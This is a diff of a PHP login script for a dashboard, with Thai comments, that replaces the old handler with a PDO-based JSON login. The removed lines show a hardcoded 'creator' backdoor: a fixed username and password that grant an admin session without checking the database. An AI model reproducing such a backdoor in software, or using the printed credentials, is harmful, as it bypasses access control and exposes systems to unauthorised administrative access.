@@ -1,39 +1,44 @@
 <?php
+// เริ่ม Session และเรียกใช้ไฟล์เชื่อมต่อฐานข้อมูล PDO
 session_start();
-require_once("../api/db.php");
+require_once __DIR__ . '/../api/db.php';
 
-$username = $_POST['username'] ?? '';
-$password = $_POST['password'] ?? '';
+// ตั้งค่า Header ให้ตอบกลับเป็น JSON
+header('Content-Type: application/json');
 
-// ✅ Creator backdoor (hardcoded)
-if ($username === '__creator' && $password === 'H2P[forever]') {
-  $_SESSION['user'] = [
-    'id' => -1,  // negative ID to avoid conflict
-    'username' => '__creator',
-    'role' => 'admin'
-  ];
-  $_SESSION['last_activity'] = time();
-  header("Location: ../page/OEE_Dashboard.php");
-  exit;
-}
+// อ่านข้อมูลที่ถูกส่งมาแบบ JSON
+$input = json_decode(file_get_contents("php://input"), true);
+$username = $input['username'] ?? '';
+$password = $input['password'] ?? '';
 
-// 🔒 Normal login path
-$sql = "SELECT id, username, password, role FROM IOT_TOOLBOX_USERS WHERE username = ?";
-$stmt = sqlsrv_query($conn, $sql, [$username]);
-
-if ($stmt && $user = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
-  if (password_verify($password, $user['password'])) {
-    $_SESSION['user'] = [
-      'id' => $user['id'],
-      'username' => $user['username'],
-      'role' => $user['role'] ?? 'operator'
-    ];
-    $_SESSION['last_activity'] = time();
-    header("Location: ../page/OEE_Dashboard.php");
+if (empty($username) || empty($password)) {
+    echo json_encode(['success' => false, 'message' => 'Username and password are required.']);
     exit;
-  }
 }
 
-// ❌ Invalid login
-echo "<script>alert('Invalid username or password'); window.location='login_form.php';</script>";
+try {
+    $sql = "SELECT id, username, password, role FROM IOT_TOOLBOX_USERS WHERE username = ?";
+    $stmt = $pdo->prepare($sql);
+    $stmt->execute([$username]);
+    $user = $stmt->fetch();
+
+    if ($user && password_verify($password, $user['password'])) {
+        session_regenerate_id(true);
+        
+        $_SESSION['user'] = [
+            'id' => $user['id'],
+            'username' => $user['username'],
+            'role' => $user['role']
+        ];
+        
+        echo json_encode(['success' => true, 'message' => 'Login successful.']);
+    } else {
+        echo json_encode(['success' => false, 'message' => 'Invalid username or password.']);
+    }
+
+} catch (PDOException $e) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'message' => 'A database error occurred.']);
+    error_log("Login Error: " . $e->getMessage());
+}
 ?>
